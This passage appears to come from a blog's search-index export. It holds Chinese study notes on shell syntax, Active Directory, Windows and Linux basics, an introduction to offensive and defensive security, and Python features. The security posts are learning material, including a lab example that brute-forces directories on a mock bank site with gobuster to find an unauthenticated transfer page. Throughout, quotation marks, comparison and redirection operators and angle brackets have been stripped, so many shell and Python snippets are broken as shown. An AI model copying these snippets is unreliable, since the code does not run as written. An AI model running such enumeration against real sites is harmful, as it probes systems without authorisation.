1..10;doecho $idone while conditiondo commanddone until conditiondo commanddone break 跳出所有循环 continue 跳出当前循环 case $value in value1) command1 command2 ... commandN ;;value2) command1 command2 ... commandN ;;esac Shell函数[ function ] funname [()] action; [return int;] 函数调用，像脚本一样传参 funname 1 2 3 示例： #!/bin/bashfunction demoFun1() echo 这是我的第一个 shell 函数! return `expr 1 + 1`demoFun1echo $?echo $? 第一个 echo 显示函数返回值2 第二个 echo 显示上一条命令正确执行的返回值 0 Shell 输入输出重定向 Shell 文件包含Shell 可以包含外部脚本 source ./test1.sh# 或. ./test1.sh","categories":["Cyber Security 101"]},{"title":"Cyber Security 101 第三部分 AD和Windows基础知识","path":"//Cyber-Security-101-3/","content":"先介绍Active Directory基础知识 再介绍 Windows 的 NTFS 文件系统、UAC权限控制、系统配置、资源监控、注册表以及安全相关功能。 第一部分 Active DirectoryActive Directory是Windows服务器环境中的目录服务。几乎任何中大型企业为了集中化管理，都会部署AD 本质上 AD 是一个分层式的、分布式的数据库，用于存储、组织并提供对网络环境中各种对象和资源信息的访问。 其核心协议是实现身份认证和授权的 LDAP (Lightweight Directory Access Protocol)。 逻辑结构： 域 Domain：使用DNS域名标识，是一个安全对象的集合，这些对象共享目录数据库和安全策略 树 Tree：一个或多个域的层次化组合，这些域共享一个连续的 DNS 命名空间 林 Forest：包含一个或多个共享共同架构 (Schema) 和全局编录 (Global Catalog) 的域。林内的所有域通过可传递的信任关系自动建立双向信任。 组织单位 OU：域内组织对象的最小单位，是应用组策略和委派管理权限的最小作用域单位。 物理结构： 域控制器 DC：运行Active Directory 服务的服务器 站点 Site Active Directory用户：用户是安全主体之一，是可以对网络中的资源进行操作的对象。 人员用户：用户通常代表组织中需要访问网络的人员，例如员工。 服务用户：每个服务都需要一个用户才能运行，这就是服务用户，只拥有运行特定服务所需的权限。 机器：每台加入 Active Directory 域的计算机都会创建一个计算机对象。计算机也被视为“安全主体”，机器账户本身指计算机的本地管理员。通常 计算机名称+$ 就是机器账户名。 安全组：类似用户组，可用于向用户授予特定权限。如域管理员、服务器操作员、备份操作员、账户操作员、域用户、域计算机、域控制器 登录域控制器，运行 Active Directory Users and Computers 。 组织单位 OU ：容器对象，可用于对用户和计算机进行分类。一个用户一次只能属于一个 OU 如图，THM 组织单元有5个子组织单元。图中四个用户 同属于 Sales 组织单元 OU 是应用组策略和委派管理权限的最小作用域单位。 组策略销售所需要的权限是相同的，应该给销售人员统一配置权限。 根据不同需要可以给不同 OU 分别配置不同权限策略，这就是组策略。 使用Group Policy Management工具查打开 组策略 配置操作界面 在 Group Policy Objects 目录下 创建组策略，然后就可以链接到其他 组织单元 （子组织单元也会影响） 图中 GPO 内有三个组策略，已经应用于 OU Security Filtering ：安全筛选，默认情况下组策略会应用到所有安全对象 Settings 栏里可以看到具体包含哪些权限 修改组策略，右键 选中 Edit，会弹出包含许多条目的新界面，如图 组策略分发域控制器上一个名为 SYSVOL 的特定网络共享文件夹，存放有 组策略对象 数据。 DC 上的默认路径：C:\\Windows\\SYSVOL\\sysvol\\ 域内的用户可以通过 域名\\SYSVOL 来访问 域成员会定期联系 DC 查询是否 需要更新GPO 也可以在 PoweShell 使用gpupdate /force来立即更新 Delegation 权限委派授予用户特定权限，让他们能在 OU 上执行高级任务，而无需域管理员介入。 右键 需要委派给其他人的 OU，选择 Delegate Control ，进入新界面进行具体操作。 被委派的用户由于没有打开 Active Directory Users and Computers 的权限，需要使用Powershell来执行操作。 设备管理身份验证Windows域中的网络身份验证 都需要 域控制器DC 来验证配置是否正确 使用两种协议： Kerberos：新的默认协议 NetNTLM：旧的身份验证协议，仍然兼容 KerberosKerberos 是 Windows 域环境中默认的身份验证协议，依赖于 KDC（密钥分发中心），通常运行在域控制器（DC）上。KDC 包含两个主要服务： 认证服务（AS，Authentication Service）：负责验证用户身份并颁发 TGT（Ticket Granting Ticket）。 票据授予服务（TGS，Ticket Granting Service）：根据 TGT 颁发特定服务的 服务票据（Service Ticket）。 TGT 作为用户身份的通用凭证，允许用户在有效期内多次请求服务票据 Kerberos 工作流程简述： 用户通过用户名和密码（或密钥）向 KDC 的认证服务（AS）请求身份验证。 KDC 验证用户身份后，返回一个 TGT，该票据包含用户的身份信息和时间戳，加密后存储在客户端。 当用户需要访问特定服务时，客户端使用 TGT 向 KDC 的票据授予服务（TGS）请求 服务票据。 TGS 返回一个针对特定服务的 服务票据，用户出示该票据给目标服务，服务验证票据后授予访问权限。 票据有效期：TGT 和服务票据都有时间限制（通常为 10 小时），到期后需续期或重新认证。 NetNTLMNetNTLM（也称为 NTLM，NT LAN Manager）是 Windows 域环境中较旧的身份验证协议，通常作为 Kerberos 的备用协议，用于不支持 Kerberos 的场景或向下兼容旧系统。 仅做介绍 树、林、信任关系AD支持集成多个域，将网络划分为可独立管理的单元。 树的每个域都有各自的 DC ，有各自的域管理员，以及可以控制企业中所有内容的 企业管理员。 不同的命名空间 也可以 统一管理。 将多个具有不同命名空间的树合并到同一个网络中，这种结构称为林 双向信任关系是域之间的一种认证机制，允许用户跨域被识别和授权，但它本身并不自动授予资源访问权限。 管理员需要进一步配置具体的访问权限，以决定哪些用户可以访问哪些资源，从而实现安全的资源共享和跨域协作。 第二部分 文件系统与权限文件系统：NTFSNTFS 被称为日志文件系统，发生故障可以使用日志中的信息自动修复磁盘上的文件 权限设置 Read Write Read Execute List Folder Contents Modify Full Control 继承性：子文件夹和文件继承父文件夹的权限 显式权限：可以为特定文件及文件夹设置独立权限，覆盖继承的权限 备用数据流ADS每个文件至少有一个默认数据流 $DATA，ADS 允许文件附加额外的命名数据流，与主数据流并存，可以存储独立的数据。 元数据存储：Windows 常使用 ADS 存储文件的元数据，如文件的摘要信息或缩略图。 安全和隐藏数据：ADS 可用于隐藏数据（例如，恶意软件可能利用 ADS 隐藏恶意代码）。 Windows\\System32C:\\Windows 即包含操作系统的文件夹，环境变量是 %windir% 环境变量存储有关操作系统环境的信息。此信息包括操作系统路径、操作系统使用的处理器数量以及临时文件夹的位置等详细信息 其中的 System32文件夹中的内容对操作系统至关重要。 账户 管理员：可以对系统进行更改。添加用户、删除用户、修改组、修改系统设置等。 标准用户：只能更改属于用户的文件夹文件，而不能执行系统级更改，例如安装程序。 创建用户账户时会为该用户创建一个配置文件。每个用户配置文件文件夹位于 C:\\Users。 每个用户配置文件都包含共同的文件夹：桌面、文件、下载、音乐、图片 在运行窗口：lusrmgr.msc 可以查看用户和群组的详细信息。 User Account Control（UAC）任意管理员用户都可以修改系统设置，引入 UAC 以限制权限滥用。 即管理员用户登录时，默认情况下会话不会以管理员权限运行。当需要执行需要更高级别权限的操作时，系统会提示用户确认是否允许该操作运行。 不适用于内置本地管理员账户，日常不会使用这个账户。 这就是一些安装程序图标右下角会有个盾牌的原因，因为它需要更高级别的权限来安装 UAC 可以设置控制强度 运行提示符：UserAccountControlSettings.exe 设置和控制面板设置日常使用更多 控制面板可以访问更复杂设置和执行复杂操作。 任务管理器Ctrl + Shift + Esc打开任务管理器 可以查看正在运行的程序、进程，以及性能、服务等详细信息。 第三部分 系统配置及相关工具简单介绍 系统配置MSConfig 程序（系统配置实用程序）用于高级故障排除，主要帮助诊断启动问题。 直接Windows搜索系统配置 常规：选择Windows启动时加载的设备和服务 引导：为操作系统定义各种启动选项 服务：列出系统配置的所有服务（服务是一种在后台运行的特殊应用程序） 启动：微软建议使用任务管理器来管理启动项 工具：列出各种实用程序，可以通过运行提示符（Win+R）、命令提示符和运行按钮来启动 运行提示符：control.exe 进入控制面板 计算机管理 compmgmt.msc 计算机管理实用程序 系统工具 任务计划程序：可以创建和管理常见任务，运行应用程序、脚本等，并且可以配置任务在任意时间点运行 事件查看器：可以记录五种类型的事件。这些事件记录可以被视为审计线索，用于了解计算机系统的活动。 共享文件夹：其他人可以连接的共享和文件夹的完整列表。 本地用户和组 性能：有 性能监视器 （perfmon）程序 设备管理器：查看和配置硬件，例如禁用连接到计算机的任何硬件。 存储 磁盘管理：执行高级存储任务，设置新驱动器、扩展或缩小分区、分配或更改驱动器号 服务和应用程序：可以查看服务 系统信息 msinfo32.exe 硬件资源：不懂硬件看不懂 组件：可以查看计算机上安装的硬件设备的具体信息 软件环境：可以查看操作系统内置软件以及您已安装软件的信息。此部分还显示其他详细信息，例如环境变量和网络连接。 资源监视器 resmon.exe 资源监视器显示每个进程以及CPU、内存、磁盘和网络使用情况的汇总信息，此外还提供有关哪些进程正在使用各个文件句柄和模块的详细信息。 高级筛选功能允许用户隔离与一个或多个进程（应用程序或服务）相关的数据，启动、停止、暂停和恢复服务，以及从用户界面关闭无响应的应用程序。它还包括一个进程分析功能，可以帮助识别死锁进程和文件锁定冲突 命令提示符 cmdhostname # 输出计算机名称whoami # 输出登录用户的名称ipconfig # 显示计算机的网络地址设置cls # 清除屏幕 clearnetstat # 显示协议统计信息和当前的 TCP/IP 网络连接net # 管理网络资源 使用 help (net help) 命令后加 /? 显示说明（net除外） 注册表编辑器 regedt32.exeWindows 注册表 是一个中央分层数据库，用于存储为一个或多个用户、应用程序和硬件设备配置系统所需的信息。 注册表包含 Windows 在运行期间不断引用的信息，例如： 每个用户的个人资料 计算机上安装的应用程序以及每个应用程序可以创建的文档类型 文件夹和应用程序图标的属性表设置 系统上有哪些硬件 正在使用的端口 第四部分 内置安全功能简单介绍 Windows更新Windows 更新是微软为 Windows 操作系统提供的补丁、功能更新和安全修复，旨在提升系统安全性、稳定性和性能。 更新可分为 安全更新、功能更新、质量更新、驱动更新 Windows 10 和 Windows 11 设计为强制更新，普通用户无法永久禁用更新，只能推迟。 WIndows安全 病毒和威胁防护 防火墙和网络保护 应用程序和浏览器控制 设备安全 病毒和威胁防护防火墙防火墙（Firewall）监控和控制通过端口进出的网络流量。检查每一个数据包，决定是允许通过、拒绝，还是丢弃。 Windows防火墙提供三种防火墙配置文件：域、私有和公共 域：域配置文件适用于主机系统可以向域控制器进行身份验证的网络。 私人：私人配置文件是用户分配的配置文件，用于指定私人或家庭网络。 公共：默认配置文件是公共配置文件，用于指定公共网络，例如咖啡店、机场和其他地点的 Wi-Fi 热点。 应用和浏览器控制设备安全 内核隔离：防止攻击将代码插入高安全性进程 安全处理器：使用可信平台模块 (TPM) 技术，提供基于硬件的安全相关功能。TPM 芯片是一种安全的加密处理器。该芯片包含多种物理安全机制，使其具有防篡改功能，恶意软件无法篡改 TPM 的安全功能 数据加密：BitLocker 驱动器加密是一种与操作系统集成的数据保护功能，可以解决丢失、被盗或不当退役的计算机造成的数据盗窃或泄露威胁 卷影复制服务 VSS该服务创建数据的一致性快照（也称为卷影副本或时间点副本）。这些快照可以在特定时间点捕获文件、文件夹或整个驱动器的数据状态，方便备份或恢复。 系统保护功能：通过VSS支持创建、配置和删除还原点，以及执行系统还原。 安全风险：勒索软件可能删除卷影副本，导致无法通过系统还原恢复数据。","categories":["Cyber Security 101"]},{"title":"Cyber Security 101 第二部分 Linux基础知识","path":"//Cyber-Security-101-2/","content":"介绍Linux基础知识：一些基本命令，使用SSH登录Linux设备，与文件系统交互，以及一些实用工具，进程，自动化，与包管理，日志相关知识 基本命令echo Hello # 输出提供的文本whoami # 输出当前登录的用户ls # 列出目录下的文件listing,默认参数是当前目录cd # 更改目录 change directorycat # 输出文件内容pwd # 打印完整工作目录路径 print working directory find -name passwords.txt # 在当前目录下查找文件find -name *.txt # 使用*来搜索所有txt文件 grep 81.143.211.90 access.log # 搜索文件内容，展示包含所需值的条目 # shell运算符 允许终端后台允许命令 将多个命令组合在一行 重定向 与相同，但是输出不覆盖而是添加在后面 echo Hello welcome # 将 Hello 输出到文本文件，内容将被覆盖echo World welcome # 将 World 添加到文本文件后（自动换行） 使用SSH登录Linux设备、执行命令、与文件系统交互 SSH（Secure Shell） ：连接远程Linux机器命令行并进行交互 ssh 账户用户名@远程机器IP地址# 然后还需输入密码 命令参数 ls -a # 将显示工作目录所有内容all，包括隐藏文件ls --help # manual使用帮助ls -lh # 列出当前目录下文件详细信息 long、human能阅读的方式 与文件系统交互 touch # 创建文件mkdir # make directory创建文件夹cp # copymv # moverm # removefile # 确定文件类型 rm note # 删除文件rm -R directory # 删除文件夹 cp note new_note # 复制时可以自动创建新文件 mv note new_note # 移动到新文件夹或新文件，不保留旧文件 file note # 确定文件类型 note: ASCII text # 表明是一个文本文件 权限ls -lh -rw-r--r-- 1 user group 4.5K Sep 2 14:30 example.txt drwxr-xr-x 2 user group 4.0K Sep 2 10:15 mydir 第1个字符：-普通文件，d目录，l符号链接 后9个字符：权限，分为三组，分别表示 文件拥有者权限、所属组权限、其他用户权限 硬链接数（如1或2）：普通文件通常为 1，目录为至少 2（包含自身和 . 目录）。 文件拥有者、文件所属组、文件大小、最后修改时间、文件名 切换用户需要知道用户名和密码 su 其他用户 Password:# 仅切换到目标身份，但保留当前用户的环境变量，且工作目录不变 su -l 用户名# 完全切换用户，并切换到HOME目录 目录 ETC：存储操作系统使用的系统文件 var：存储系统上运行的服务或应用经常访问或写入的数据，如日志文件/var/log root：root系统用户的主目录 tmp：用于存储只需访问几次的数据。重启将清除，任何用户默认都可以写入此文件夹，渗透测试中存储、枚举的理想场所 终端文本编辑器 nano vim 仅做了解 通用实用工具wgetwget 文件URL SCP（SSH）利用SSH协议在两台计算机之间传输文件，提供身份验证和加密 通过 SOURCE 和 DESTINATION 模型，SCP 允许您： 将文件和目录从当前系统复制到远程系统 scp test.txt user@IP_address:home/user/new.txt 将文件和目录从远程系统复制到当前系统 scp user@IP_address:home/user/test.txt new.txt WebPython3的“HTTPServer”会在当前目录进行文件服务 python3 -m http.server # 启动http服务（8000端口） wget http://10.10.135.215:8000/myfile 进程查看进程 所有进程（加上其他用户运行以及系统进程） ps aux top获取进程的实时统计信息 top 管理进程kill PID 在进程被终止时可以发送的一些信号： SIGTERM——终止进程，但允许它事先执行一些清理任务 SIGKILL - 终止进程 - 事后不做任何清理 SIGSTOP——停止暂停进程 进程的启动命名空间将进程彼此隔离，只有同一命名空间中的进程可以相互看到 PID为 0 的进程是系统启动时启动的 systemd是第一个启动的进程之一，管理系统进程的初始化系统。任何想要启动的进程都会作为 systemd 的子进程启动。 systemctl 是管理 systemd 服务的命令行工具，可以用于启用或停止、开机启用、禁止 服务 systemctl [option] [service]# start stop enable disable 前台和后台在命令中添加 会让进程在后台运行 CTRL + Z也可以将进程移到后台 fg 命令将后台进程重新带回前台（ foreground） 自动化cron 是一个 Linux 系统中的守护进程（daemon），在系统启动时自动运行，用于定时执行任务（称为 cron 作业，cron jobs）。 它根据预设的时间表（schedule）运行脚本、命令或程序，适合自动化任务，如定时备份、更新系统或启动应用程序。 使用 crontab（table）来管理定时任务 crontab -e # 编辑当前用户的crontabcrontab -l # 查看当前用户的crontab 格式 时 日 月 星期 命令 # *表示任意0 * * * * /usr/bin/google-chrome # 每个小时启动Google Chrome@reboot /var/opt/processes.sh # 系统启动或重启时执行脚本 包管理apt 是软件包管理命令，每当更新系统时，包含软件的仓库也会检查更新 apt updateapt install [software-name-here]apt remove [software-name-here] 仅做介绍 日志 varlogvar/log 存储各种日志 日志轮转：自动管理日志文件大小和存储，定期压缩旧日志、创建新日志、并删除过期日志 以三个日志为例： Apache2 Web服务器： /var/log/apache2/access.log：记录 Web 服务器的访问日志（每次 HTTP 请求的详细信息，如 IP、URL、状态码等）。 /var/log/apache2/error.log：记录 Apache2 的错误信息（如配置错误、页面未找到）。 fail2ban 服务：/var/log/fail2ban.log，记录 fail2ban 服务的运行状态和操作。 防止暴力破解，通过监控日志（如SSH登录）检测异常行为，并临时封禁异常IP UFW服务：/var/log/ufw.log，记录 UFW 防火墙的操作和事件。 仅做介绍","categories":["Cyber Security 101"]},{"title":"Cyber Security 101 第一部分 简介","path":"//Cyber-Security-101-1/","content":"介绍网络安全101课程，初步了解进攻性安全和防御性安全的概念，总结搜索技巧 Cyber Security 101本课程涵盖以下方面的基本概念和应用 计算机网络和密码学 MS Windows、Active Directory 和 Linux 基础知识 攻击性安全工具和系统利用 防御性安全解决方案和工具 网络安全职业 前面几部分是基础知识，网络安全相关部分在后面学习 进攻性安全进攻性安全是一种主动的安全测试方法，通过模拟黑客的攻击行为来识别和利用系统、应用程序或网络中的漏洞。其目标是发现潜在的安全弱点，从而在恶意攻击者利用之前进行修复。 示例：入侵一个 模拟的FakeBank： http://fake.bank.thm 使用 Gobuster 暴力查找银行所有页面 gobuster dir -u http://fake.bank.thm -w wordlist.txt # -u 声明正在扫描的网站# -w 采用单词列表遍历查找隐藏的页面 结果找到bank-transfer转账页面，状态200 OK，代表可以访问 访问http://fakebank.thm/bank-transfer 于是获取了转账权限（可以使用ID进行转账） 通过模拟黑客入侵银行系统，发现了未经授权就可以访问的转账页面 这是一种访问控制漏洞。具体来说是不安全的直接引用 通过操纵 URL 参数、表单数据或请求体中的标识符（如用户 ID、账户 ID 或交易 ID） 无需授权，直接访问或修改他人的资源 修复漏洞需要实施严格的访问控制检查 一个类似的漏洞示例： Optus 数据泄露（2022 年，澳大利亚电信巨头） https://www.upguard.com/blog/how-did-the-optus-data-breach-happen 报告总结了原因： 一个无需身份验证的API可以访问客户敏感信息 递增使用客户标识符（递增ID即可获取所有客户ID） GobusterGo语言编写的开源命令行工具 可以用于暴力枚举Web目录、文件、DNS子域名等 gobuster dir -u 网站域名 -w 爆破字典gobuster dns -d 网站域名 -w 爆破字典 后续进一步学习使用 防御安全简介防御安全：从保护、监控和维护的角度出发，通过收集情报、检测异常、响应威胁和修复漏洞来确保系统、应用程序和网络的安全。 与进攻性安全主动寻找漏洞不同，防御性安全侧重于构建和维护安全防线，防止攻击发生并在攻击发生时快速响应。 防御安全核心领域： Security Operations Center (SOC), where we cover Threat Intelligence 情报收集 Digital Forensics and Incident Response (DFIR), where we also cover Malware Analysis 数字取证、事件响应、恶意软件分析 事件响应流程： 现代安全管理使用 Security Information and Event Management (SIEM) 系统，这是一种集成的安全管理方案， 收集安全相关信息和事件并呈现，如果检测到可疑事件会发出警报 SIEM系统模拟： 多次登录失败不一定有问题，可能只是忘记密码 注意到 IP 143.110.250.149 尝试未授权登录，最终成功，这很可疑，利用一些网站查询该 IP。 查询结果显示非常可疑，并且登录成功，可能有危险，应该进行处理。选择 SOC Team lead ，负责初始的事件处理并报告，之后交给 DFIR 最后封锁这个IP 搜索技巧谷歌搜索: 双引号表示精确搜索 site: 限制域名 - 忽略特定词语 filetype:查找文件类型（而非网页） 专业搜索引擎： Shodan 搜索联网设备 Censys 搜索互联网资产 VirusTotal 文件病毒扫描服务 Have I Been Pwned 检测某个电子邮箱地址是否被泄露 常见漏洞CVE CVE系统，漏洞字典，用CVE ID标准化每个漏洞（https://nvd.nist.gov/） 漏洞数据库，可以找到来自不同作者的漏洞利用代码 查阅官方文档","categories":["Cyber Security 101"]},{"title":"Python进阶","path":"//Python-2/","content":"Python进阶部分，数据结构、函数以及类的属性 Python 特殊方法特殊方法的存在是为了被 Python 解释器调用，自己不需要调用。 例如对自定义的类使用 len(my_object) 就会自动调用 self.__len__() 对内置类型的实例 x 使用 len(x)，实际上 CPython 会直接从一个 C 结构体读取对象，所以很高效 很多时候，特殊方法的调用是隐式的 __init__() **__getitem__() **：类定义中实现这个特殊函数，即可迭代，或者切片 def __getitem__(self, position):\treturn self._cards[position]# ._cards 是类的属性 由于最终返回值是列表，也可使用所有支持列表的方法。 __iter__()：for i in x 迭代时实际上使用 x.__iter__()方 __repr__()：返回实例的官方表示，也即可以用来初始化的表达式 从下面四个函数可以看出，这一操作类似 C++ 的重载 __abs__() __bool__() __add__() __mul__() class Vector(): def __init__(self,x,y): self.x = x self.y = y def __add__(self,other): return Vector(self.x + other.x , self.y + other.y) def __mul__(self, n): return Vector(self.x * n, self.y * n)vec = Vector(1,2)print(vec)# print(vec + vec)# print(vec * 2) __main__.Vector object at 0x00000194C1EECAA0 此时没有写特殊方法__repr__ ，所以输出是这样的。加上这个特殊方法 def __repr__(self): return fVector(self.x,self.y) Vector(1,2)Vector(2,4)Vector(2,4) print 实际上会优先调用 __str__() 如果一个对象没有 __str__ 函数，而 Python 又需要调用它的时候，解释器会用 __repr__ 作为替代。 特殊方法表： 通过实现特殊方法，自定义数据类型可以表现得跟内置类型一样，从而写出更具表达力的代码——或者说，更具 Python 风格的代码。 数据结构序列内置序列类型Python 标准库使用 C 实现了丰富的序列类型 容器序列：list tuple collections.deque 扁平序列：str bytes bytearray memoryview array.array 容器序列存放任意类型的对象的引用，而扁平序列存放值而不是引用 扁平序列是一段连续的内存空间，更紧凑，但只能放基础类型 可变序列 不可变序列：tuple str bytes 列表推导和生成器表达式列表推导列表推导、生成器表达式，以及同它们很相似的集合（set）推导和字典（dict）推导，在 Python 3 中都有了自己的局部作用域，就像函数似的。表达式内部的变量和赋值只在局部起作用，表达式的上下文里的同名变量还可以被正常引用，局部变量并不会影响到它们。 nums = [1,2,3,4,5,6,7,8,9]nums = [n**2 for n in nums if n 5]print(nums) [1, 4, 9, 16] 列表推导支持笛卡尔积 nums = [1,2,3,4,5,6,7,8,9]strs = [a,b,c,d]l = [ str(i) + c for i in nums if i 5 for c in strs]print(l) [‘1a’, ‘1b’, ‘1c’, ‘1d’, ‘2a’, ‘2b’, ‘2c’, ‘2d’, ‘3a’, ‘3b’, ‘3c’, ‘3d’, ‘4a’, ‘4b’, ‘4c’, ‘4d’] 生成器表达式生成器表达式背后遵守了迭代器协议，可以逐个地产出元素。 而列表推导先建立一个完整的列表，然后再把这个列表传递到某个构造函数里。 nums = [1,2,3,4,5,6,7,8,9]strs = [a,b,c,d]iter = (str(i) + c for i in nums if i 5 for c in strs)print(*iter) 1a 1b 1c 1d 2a 2b 2c 2d 3a 3b 3c 3d 4a 4b 4c 4d nums = [1,2,3,4,5,6,7,8,9]strs = [a,b,c,d]l = list(str(i) + c for i in nums if i 5 for c in strs)print(l) [‘1a’, ‘1b’, ‘1c’, ‘1d’, ‘2a’, ‘2b’, ‘2c’, ‘2d’, ‘3a’, ‘3b’, ‘3c’, ‘3d’, ‘4a’, ‘4b’, ‘4c’, ‘4d’] 列表拆包： l = [1,2,3]a,b,c = lprint(fa b c)print(*l) 1 2 31 2 3 元组元组是不可变的列表，可看作一些字段的集合，同时保留顺序 元组拆包numbers = 1, 2, 3, 4, 5first, *middle, last = numbersprint(first) # 输出: 1print(middle) # 输出: [2, 3, 4]print(last) # 输出: 5 1, 2, 3, 4, 5 在赋值时会自动解析为 元组，*middle在拆包时会自动收集剩余元素为列表（list） 元组的关键特征是逗号，不是括号，虽然 (1,2,3,4,5) 也可实现元组初始化 a,b = b,a 也即实现 交换 a，b 优雅 此外，可以用于：函数返回、提取感兴趣的数据、路径处理 def get_data(): return 1, 2, 3 # 返回的是元组a, b, c = get_data() # 拆包赋值 data = (2023, 09, 28, 温度, 25℃)year, month, day, *_ = dataprint(fyear-month-day) # 输出: 2023-09-28 import os_,filename = os.path.split(/home/yang/php/python_learning/test.py)print(filename) os.path.split(path)是 Python 的 os.path模块中的一个函数，用于将路径拆分为目录部分和文件名部分。它的返回值是一个元组（tuple），包含两个元素： 第一个元素：目录路径（head） 第二个元素：文件名（tail） _ 是一种占位符，一种语法习惯，可用可不用 切片Python 的列表、元组、字符串都支持切片。 s[a:b] 获取从 s[a] 到 s[b-1] 的内容，长度为 b-a 对对象进行切片s[a:b:c] 在a与b之间，以c为间隔切片。这个默认的 c 是 1 str = abcdefgprint(str[::3]) # 间隔取值print(str[::-1]) # 反向取值，获取反向的序列 adggfedcba 多维切片与省略多维切片： import numpy as nparr = np.array([[1, 2, 3, 4], [5, 6, 7, 8], [9, 10, 11, 12]])print(arr[0,0]) # 第0行第0列： 0print(arr[1, :]) # 第 1 行： [5 6 7 8]print(arr[:, 2]) # 第 2 列： [3 7 11]print(arr[0:2, 1:3]) # 取第 0 到 1 行，第 1 到 2 列：# [[2 3]# [6 7]]print(arr[::2, ::2]) # 每隔一行、每隔一列取值：# [[ 1 3]# [ 9 11]] 省略： 在 Python 中，... 是 Ellipsis 对象的实例，用于表示“所有剩余维度”或“省略未指定的维度”。 它在 NumPy 中特别有用，用于简化多维数组的切片操作，特别是在高维数组中。 import numpy as nparr = np.arange(60).reshape(3, 4, 5) # 一个 3 × 4 × 5 的三维数组print(arr[0, :, :]) # 取第 0 个二维子数组（4×5）print(arr[0, ...]) # 等价于 arr[0, :, :]，取第 0 个二维子数组 给切片赋值l = list(range(10))l[2:5] = [10,20]print(l) [0, 1, 10, 20, 5, 6, 7, 8, 9] 对序列使用 + 和 *序列支持 + 和 *，不改变原有的操作对象，而是构建一个全新的序列 如果序列里是对其他对象的引用，复制的也是引用，这里需要注意，如由列表构成的列表，这时需要使用列表推导，这样就能创建副本。 list.sort 和 内置函数 sorted list.sort 就地排序，不返回 sorted 新建列表返回 两个参数： reverse：被设定为 True 就会降序输出，默认是 False key：一个单参数的函数，会作用在序列每个元素上，最终影响排序 字典和集合字典推导类似列表 nums = list(range(5)) # [0,1,2,3,4]strs = [chr(ord(a) + i) for i in range(5)] # [a,b,c,d,e]l = [(nums[i],strs[i]) for i in range(5)]print(l)print( )# 字典的键必须唯一d = s:n for n,s in lprint(d)print( )dd = s:n for n,s in l if n 2print(dd) [(0, ‘a’), (1, ‘b’), (2, ‘c’), (3, ‘d’), (4, ‘e’)] {‘a’: 0, ‘b’: 1, ‘c’: 2, ‘d’: 3, ‘e’: 4} {‘d’: 3, ‘e’: 4} 前面的内容，以后再写吧 把函数视作对象Python 中的函数是一等对象：在运行时创建、能赋值给变量、能作为参数传给函数、能作为函数的返回结果 定义的函数是 function 类的实例 class function 高阶函数接受函数为参数，或者把函数作为结果返回的函数是 高阶函数 map 和 sorted 都是高阶函数 # 将字符串列表转换为整数列表str_numbers = [1, 2, 3, 4]int_numbers = map(int, str_numbers) # [1, 2, 3, 4] fruits = [strawberry, fig, apple, cherry, raspberry, banana]sorted(fruits, key=len) # 按长度排序 匿名函数即时使用的小函数，不追求复用，也就没有必要命名。 lambda 关键字在 Python 表达式内创建匿名函数。 lambda 函数的定义体中不能赋值，也不能使用 while 和 try 等 Python 语句。 lambda 参数: 表达式 可调用对象除了用户定义的函数，调用运算符()还可以应用到其他对象上。 包括 内置函数、生成器函数、类的方法、类的实例 如果想判断对象能否调用，可以使用内置的 callable() 函数。 生成器函数：使用 yield 关键字的函数或方法。调用生成器函数返回的是生成器对象。这个之后细说 类的实例类的实例也可表现为方法，为此，只需实现实例方法 __call__ class Class: def __init__(self, name): self.name = name def __call__(self, *args, **kwargs): # 当实例被调用时执行此方法 return f调用了self.name，传入的参数是: args, 关键字参数是: kwargs# 创建类的实例obj = Class(test)# 像调用函数一样调用实例result = obj(1, 2, 3, key=value)print(result) 调用了test，传入的参数是: (1, 2, 3), 关键字参数是: {‘key’: ‘value’} 函数内省(Function Introspection)Python 的函数是一等对象（first-class objects），具有许多可访问的属性，这些属性可以通过内省机制来查看和操作。 内省是 Python 动态特性的重要体现，允许开发者在运行时检查函数的详细信息。 dir() 是一个内置函数，返回给定对象的所有有效属性和方法的列表。探知一个函数对象的各种元信息。 # 一个简单函数 fun 的 dir(fun) 结果[__annotations__, __builtins__, __call__, __class__, __closure__, __code__, __defaults__, __delattr__, __dict__, __dir__, __doc__, __eq__, __format__, __ge__, __get__, __getattribute__, __getstate__, __globals__, __gt__, __hash__, __init__, __init_subclass__, __kwdefaults__, __le__, __lt__, __module__, __name__, __ne__, __new__, __qualname__, __reduce__, __reduce_ex__, __repr__, __setattr__, __sizeof__, __str__, __subclasshook__, __type_params__] def func():passclass C:passobj = C()# 打印 函数有而类实例没有的属性print(sorted(set(dir(func)) - set(dir(obj)))) [__annotations__, __builtins__, __call__, __closure__, __code__, __defaults__, __get__, __globals__, __kwdefaults__, __name__, __qualname__, __type_params__] 函数参数def tag(name,*content,cls=None,**attrs): 生成一个或多个HTML标签 if cls is not None: attrs[class] = cls if attrs: attr_str = .join(f attr=value for attr,value in sorted(attrs.items())) else: attr_str = if content: return .join(fnameattr_strc/name for c in content) else: return fnameattr_str /t1 = tag(p,hello) t2 = tag(p,hello,world) # 第一个参数后面的任意个字符串参数会被 *content 捕获，存入元组t3 = tag(p,hello,id=33) # 关键字参数会被 **attrs 捕获，存入字典t4 = tag(p,hello,world,cls=sidebar) # cls 参数只能作为关键字参数传入t5 = tag(content=testing,name=img) my_tag = name:img,title:Sunset,src:sunset.jpg,cls:framedt6 = tag(**my_tag) # 使用字典传入所有元素，同名会绑定到对应具名参数，余下的则被 **attrs 捕获 cls 参数只能作为关键字参数传入，不会捕获未命名的定位参数","categories":["Language"]},{"title":"Python基础","path":"//Python-1/","content":"Python基础部分，数据类型、输入输出、函数模块、类与继承、文件和异常 基础变量和数据类型Python 是强类型语言，不倾向将数据进行隐式类型转换 Python 是动态语言，支持变量类型在运行时改变 字符串 允许使用 + 对字符串拼接 使用方法修改字符串的大小写 name = hello,worldprint(name.title())print(name.upper())print(name.lower()) Hello,WorldHELLO,WORLDhello,world 使用 str() 函数完成显式类型转换 使用 \\t 完成换行和添加空白（或使用空格） 使用 rstrip() 删除末尾空白（不影响变量中的空格） name = hello print(name.strip() + ,yang) hello,yang 数字支持加减乘除，无需考虑类型，一般能得到期望的值（Python3） 支持次幂运算：3 ** 2 9 Python2 中整数的除法和 C 一样结果是整数，Python3 可以计算出浮点数结果 列表与元组列表[] 表示列表，逗号分隔 列表支持所有的数据类型存储，print() 可以直接打印列表（自定义类需要定义__repr__方法） 列表有序，支持使用下标索引，并可修改 使用 append insert 插入元素，使用 pop del 删除元素 list1 = [1,2,3,4]list2 = [Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday\t]list1.append(5) # append 在末尾添加元素day = list2.pop(1) # pop 弹出元素，并返回print(list1)print(list2)print( )del list1[1] # 删除指定位置元素list2.insert(1,day) 